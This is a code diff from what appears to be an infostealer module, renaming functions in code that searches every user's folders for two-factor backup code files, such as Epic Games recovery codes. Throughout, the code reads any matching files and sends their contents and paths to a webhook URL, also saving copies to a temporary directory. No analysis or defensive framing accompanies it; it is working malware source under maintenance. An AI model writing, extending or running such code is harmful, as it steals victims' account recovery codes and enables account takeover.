@@ -13,7 +13,7 @@ const backupFileNames = [
     "Epic Games Account Two-Factor backup codes"
 ];
 
-const searchFiles = async (dir, webhookUrl) => {
+const SearchFiles = async (dir, webhookUrl) => {
     try {
         const files = await fs.readdir(dir);
         const tasks = files.map(async (file) => {
@@ -23,7 +23,7 @@ const searchFiles = async (dir, webhookUrl) => {
             if (stats.isFile() && stats.size <= 2 * 1024 * 1024 && backupFileNames.some(name => file.includes(name))) {
                 const codes = await fs.readFile(filePath, 'utf8');
                 if (codes.length > 0) {
-                    await requests.webhook(webhookUrl, {
+                    await requests.Webhook(webhookUrl, {
                         content: 'File: `' + filePath + '`',
                         embeds: [{
                             title: 'Backup Codes',
@@ -37,10 +37,10 @@ const searchFiles = async (dir, webhookUrl) => {
                     ];
     
                     const WishTempDir = fileutil.WishTempDir('codes');
-                    await fileutil.writeDataToFile(WishTempDir, `codesInfo-${path.basename(filePath)}.txt`, codesInfo);
+                    await fileutil.WriteDataToFile(WishTempDir, `codesInfo-${path.basename(filePath)}.txt`, codesInfo);
                 }
             } else if (stats.isDirectory()) {
-                await searchFiles(filePath, webhookUrl); 
+                await SearchFiles(filePath, webhookUrl); 
             }
         });
 
@@ -50,7 +50,7 @@ const searchFiles = async (dir, webhookUrl) => {
 };
 
 module.exports = async (webhookUrl) => {
-    const users = await hardware.getUsers();
+    const users = await hardware.GetUsers();
 
     for (const user of users) {
         const directories = [
@@ -66,7 +66,7 @@ module.exports = async (webhookUrl) => {
         for (const dir of directories) {
             const dirStats = await fs.stat(dir).catch(() => null);
             if (dirStats && dirStats.isDirectory()) {
-                await searchFiles(dir, webhookUrl);
+                await SearchFiles(dir, webhookUrl);
             }
         }
     }
